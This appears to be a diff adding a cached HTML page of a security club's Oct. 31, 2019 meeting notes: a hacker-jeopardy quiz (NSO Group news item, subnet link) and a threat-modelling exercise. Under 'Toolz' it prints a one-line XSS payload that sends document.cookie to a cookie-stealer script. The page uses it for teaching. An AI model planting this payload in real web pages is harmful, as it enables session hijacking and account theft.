@@ -1,0 +1,30 @@
+I"<h1 id="meeting-notes-oct-31-2019">Meeting Notes Oct. 31, 2019:</h1>
+
+<h2 id="hacker-jeopardy---scrypy">Hacker Jeopardy -&gt; @scrypy</h2>
+<ul>
+  <li><strong>Newz:</strong>
+    <ul>
+      <li>This famous hacking group is being sued by facebook for hacking into WhatsApp to spy on government officials and journalists. (NSOGroup)</li>
+    </ul>
+  </li>
+  <li><strong>Toolz:</strong>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">document.location='http://127.0.0.1/cookiestealer.php?c='+document.cookie;</code></li>
+    </ul>
+  </li>
+  <li><strong>Knawledge:</strong>
+    <ul>
+      <li>this is how you determine the number of IPs available in a network from the netmas:
+https://community.spiceworks.com/networking/articles/2491-how-to-calculate-a-subnet-mask</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="hack-the-planet---scrypy">Hack the Planet! -&gt; @scrypy</h2>
+<ul>
+  <li>Practice walking through a threat/risk analysis scenario by building an attack/defense plan for taking over the world!</li>
+</ul>
+
+<p><br />
+@scrypy</p>
+:ET
